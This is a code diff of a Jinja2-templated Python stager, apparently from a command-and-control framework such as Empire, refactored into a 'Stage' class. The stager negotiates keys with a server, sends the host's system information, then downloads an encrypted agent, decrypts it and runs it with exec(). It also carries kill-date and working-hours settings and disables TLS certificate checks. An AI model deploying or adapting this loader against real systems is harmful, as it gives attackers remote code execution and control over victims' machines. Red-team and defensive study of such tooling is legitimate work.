@@ -12,103 +12,99 @@ This file is a Jinja2 template.
 import base64
 import random
 import string
+import time
+import urllib.request
 
-{% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
+{% include 'common/rc4.py' %}
 {% include 'common/diffiehellman.py' %}
 {% include 'common/get_sysinfo.py' %}
 {% include 'smb/comms.py' %}
 
 
-# generate a randomized sessionID
-sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
+class Stage:
+    def __init__(self):
+        self.staging_key = b'{{ staging_key }}'
+        self.profile = '{{ profile }}'
+        self.server = '{{ host }}'
+        self.kill_date = '{{ kill_date }}'
+        self.working_hours = '{{ working_hours }}'
 
-# server configuration information
-stagingKey = b'{{ staging_key }}'
-profile = '{{ profile }}'
-WorkingHours = '{{ working_hours }}'
-KillDate = '{{ kill_date }}'
-server = ''
+        if self.server.startswith("https"):
+            hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None
 
-parts = profile.split('|')
-taskURIs = parts[0].split(',')
-userAgent = parts[1]
-headersRaw = parts[2:]
+        self.session_id = self.generate_session_id()
+        self.key = None
+        self.headers = self.initialize_headers(self.profile)
+        self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, headers=self.headers, server=self.server, taskURIs=self.taskURIs)
 
-# global header dictionary
-#   sessionID is set by stager.py
-# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
-headers = {'User-Agent': userAgent}
+    @staticmethod
+    def generate_session_id():
+        return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
 
-# parse the headers into the global header dictionary
-for headerRaw in headersRaw:
-    try:
-        headerKey = headerRaw.split(":")[0]
-        headerValue = headerRaw.split(":")[1]
-        if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
-        else:
-            headers[headerKey] = headerValue
-    except:
-        pass
+    def initialize_headers(self, profile):
+        parts = profile.split('|')
+        self.taskURIs = parts[0].split(',')
+        userAgent = parts[1]
+        headersRaw = parts[2:]
+        headers = {'User-Agent': userAgent}
+        for headerRaw in headersRaw:
+            try:
+                headerKey, headerValue = headerRaw.split(":")
+                headers[headerKey] = headerValue
+            except Exception:
+                pass
+        return headers
 
-# stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
-clientPub=DiffieHellman()
-public_key = str(clientPub.publicKey).encode('UTF-8')
-hmacData=aes_encrypt_then_hmac(stagingKey,public_key)
+    def execute(self):
+        # Diffie-Hellman Key Exchange
+        client_pub = DiffieHellman()
+        public_key = str(client_pub.publicKey).encode('UTF-8')
+        hmac_data = aes_encrypt_then_hmac(self.staging_key, public_key)
 
-# RC4 routing packet:
-#   meta = STAGE1 (2)
-routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)
+        # Build and Send Routing Packet
 
-#try:
-#postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
-# response = post_message(postURI, routingPacket+hmacData)
-b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-send_queue.Enqueue("2" + b64routingPacket)
+        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
+        b64routing_packet = base64.b64encode(routing_packet).decode('UTF-8')
+        self.packet_handler.send_queue.Enqueue("2" + b64routing_packet)
 
-while receive_queue.Count == 0:
-    time.sleep(1)
+        while self.packet_handler.receive_queue.Count == 0:
+            time.sleep(1)
 
-data = receive_queue.Peek()
-print(data)
-response = base64.b64decode(data)
-receive_queue.Dequeue()
-print(response)
+        data = self.packet_handler.receive_queue.Peek()
+        response = base64.b64decode(data)
+        self.packet_handler.receive_queue.Dequeue()
 
-# decrypt the server's public key and the server nonce
-packet = aes_decrypt_and_verify(stagingKey, response)
-nonce = packet[0:16]
-serverPub = int(packet[16:])
+        # Decrypt Server Response
+        packet = aes_decrypt_and_verify(self.staging_key, response)
+        nonce, server_pub = packet[0:16], int(packet[16:])
 
-# calculate the shared secret
-clientPub.genKey(serverPub)
-key = clientPub.key
+        # Generate Shared Secret
+        client_pub.genKey(server_pub)
+        self.key = client_pub.key
+        self.packet_handler.key = self.key
 
+        # Send System Info
+        hmac_data = aes_encrypt_then_hmac(self.key, get_sysinfo(nonce=str(int(nonce) + 1)).encode('UTF-8'))
+        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=3, enc_data=hmac_data)
 
-# step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
-hmacData = aes_encrypt_then_hmac(key, get_sysinfo(nonce=str(int(nonce)+1)).encode('UTF-8'))
+        b64routing_packet = base64.b64encode(routing_packet).decode('UTF-8')
+        self.packet_handler.send_queue.Enqueue("2" + b64routing_packet)
 
-# RC4 routing packet:
-#   sessionID = sessionID
-#   language = PYTHON (2)
-#   meta = STAGE2 (3)
-#   extra = 0
-#   length = len(length)
-routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)
-b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-send_queue.Enqueue("2" + b64routingPacket)
+        while self.packet_handler.receive_queue.Count == 0:
+            time.sleep(1)
 
-while receive_queue.Count == 0:
-    time.sleep(1)
+        data = self.packet_handler.receive_queue.Peek()
+        response = base64.b64decode(data)
+        self.packet_handler.receive_queue.Dequeue()
 
-data = receive_queue.Peek()
-response = base64.b64decode(data)
-receive_queue.Dequeue()
+        # Decrypt and Execute Agent
+        agent_code = aes_decrypt_and_verify(self.key, response)
+        exec(agent_code, globals())
+        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
+        self.packet_handler.agent = agent
+        agent.run()
 
-# step 6 -> server sends HMAC(AES)
-agent = aes_decrypt_and_verify(key, response)
-agent = agent.replace('{{ working_hours }}', WorkingHours)
-agent = agent.replace('{{ kill_date }}', KillDate)
-
-exec(agent)
+# Initialize and Execute Agent
+stage = Stage()
+stage.execute()
